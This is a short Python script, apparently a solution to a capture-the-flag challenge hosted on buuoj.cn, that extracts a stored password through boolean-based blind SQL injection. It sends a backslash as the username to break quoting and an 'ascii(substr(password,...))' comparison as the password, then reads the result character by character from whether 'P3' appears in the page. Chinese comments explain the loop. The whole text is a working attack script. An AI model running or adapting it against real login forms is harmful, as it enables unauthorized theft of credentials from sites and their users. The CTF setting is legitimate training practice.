import time
import requests

url="http://fed28533-eed0-4dbc-8446-36d87747cd17.node3.buuoj.cn/index.php"
result=[]
for k in range(1,20):
	for i in range(65,126):
		payload={"username":"\\","password":'or (ascii(substr(password,'+str(k)+',1))>'+str(i)+')#'}
		# {'username': '\\', 'password': 'or (ascii(substr(password,1,1))>65)#'} 循环判断密码第n位的ascii码值
		req=requests.post(url=url,data=payload)
		time.sleep(0.5)
		if("P3" in req.text):  #当语句正确时页面中含有P3
			print(chr(i))
			result.append(chr(i))
			print(result)
			break	#找到第一位密码，接着判断第二位
print(result,end="")
